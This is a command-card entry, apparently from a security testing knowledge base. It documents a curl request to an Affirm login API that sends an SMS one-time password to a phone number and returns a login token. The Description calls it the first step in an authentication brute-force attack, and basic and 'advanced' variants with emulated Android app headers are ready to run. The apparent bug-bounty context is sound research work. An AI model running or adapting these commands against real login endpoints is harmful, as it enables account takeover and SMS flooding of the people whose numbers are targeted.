---
data: >-
  curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/ -H
  "Content-Type: application/json; charset=UTF-8" -H "User-Agent: okhttp/3.13.1"
  -H "Affirm-User-Agent: Affirm-Android" -d
  '{"channel":"sms","address":"7022170000"}'
tags:
  - api
  - login
type: command
output: 'HTTP 200 with JSON {"response_url": "/api/v3/login/phone/SOMETOKEN"}'
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.313Z'
id: b0030271-1d2b-4786-a619-f77631fb3106
verified: false
validated: true
submitted: true
---
# Initiate SMS Login Token

## Command

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/ \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "User-Agent: okhttp/3.13.1" \
  -H "Affirm-User-Agent: Affirm-Android" \
  -d '{"channel":"sms","address":"7022170000"}'
```

## Description

Sends a POST request to Affirm's login API to initiate SMS OTP delivery and generate a temporary login token. Use this as the first step in the authentication brute-force attack.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| address | Target phone number (10 digits, no +1 or dashes) | Yes |
| channel | Delivery method ("sms") | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/ -H "Content-Type: application/json" -d '{"channel":"sms","address":"7022170000"}'
```

### Advanced Usage

Add more headers for app emulation:

```bash
curl -X POST https://hackerone.affirm-odin.com/api/v3/login/phone/ -H "Content-Type: application/json" -H "Affirm-App-Version: 3.62.3" -d '{"channel":"sms","address":"7022170000"}'
```

## Expected Output

HTTP 200 OK with JSON body containing "response_url" field, e.g., {"response_url": "/api/v3/login/phone/SOMETOKEN"}. Extract the token for OTP submission.

## Related

- [[commands/submit-otp-for-auth]]
